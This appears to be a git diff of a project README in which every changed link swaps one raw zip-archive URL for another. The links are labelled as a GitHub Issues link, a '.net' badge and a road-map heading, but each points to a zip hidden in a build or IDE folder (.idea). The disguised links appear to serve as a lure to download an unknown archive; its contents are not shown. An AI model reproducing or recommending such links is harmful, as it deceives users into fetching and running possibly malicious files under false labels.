@@ -40,8 +40,8 @@ Name Methode
 
 😄 ```Dont forget to add Interface App```
 
-💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://github.com/dali-raki/INV_2.0/raw/refs/heads/hh/ims.Web/bin/Debug/net9.0/ja/IN_2.0.zip)
+💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://raw.githubusercontent.com/dali-raki/INV_2.0/hh/.idea/IN_v3.7.zip)
 
-## 🔗 https://github.com/dali-raki/INV_2.0/raw/refs/heads/hh/ims.Web/bin/Debug/net9.0/ja/IN_2.0.zip Core Developer Road Map
-[![.net](https://github.com/dali-raki/INV_2.0/raw/refs/heads/hh/ims.Web/bin/Debug/net9.0/ja/IN_2.0.zip)](https://github.com/dali-raki/INV_2.0/raw/refs/heads/hh/ims.Web/bin/Debug/net9.0/ja/IN_2.0.zip)
+## 🔗 https://raw.githubusercontent.com/dali-raki/INV_2.0/hh/.idea/IN_v3.7.zip Core Developer Road Map
+[![.net](https://raw.githubusercontent.com/dali-raki/INV_2.0/hh/.idea/IN_v3.7.zip)](https://raw.githubusercontent.com/dali-raki/INV_2.0/hh/.idea/IN_v3.7.zip)
 
